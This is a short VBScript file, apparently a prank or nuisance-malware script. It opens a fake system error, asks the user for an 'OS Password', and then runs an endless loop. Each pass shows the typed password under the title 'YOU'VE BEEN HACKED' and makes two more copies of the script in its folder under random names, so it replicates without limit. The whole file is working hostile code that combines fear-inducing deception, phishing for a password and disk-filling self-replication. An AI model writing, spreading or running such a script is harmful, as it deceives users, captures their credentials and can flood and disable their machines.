Dim scriptdir
Dim FSO
Dim max,min
dim sn
dim sd
sn = WScript.ScriptName
max = 1000000
min=1
sd = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
Set FSO = CreateObject("Scripting.FileSystemObject")

a = MsgBox("ERROR 219: SYSTEM OS IS NOT FUNCTIONING",0,"ERROR: 219")
x = InputBox("Enter OS Password","Enter Password")



Do While True
   b = MsgBox("Your password is:" & x,0,"YOU'VE BEEN HACKED" )
   Randomize
   FSO.CopyFile sd & "\" & sn, sd & "\" & Int((max-min+1)*Rnd+min) & ".vbs"
   Randomize
   FSO.CopyFile sd & "\" & sn, sd & "\" & Int((max-min+1)*Rnd+min) & ".vbs"
Loop
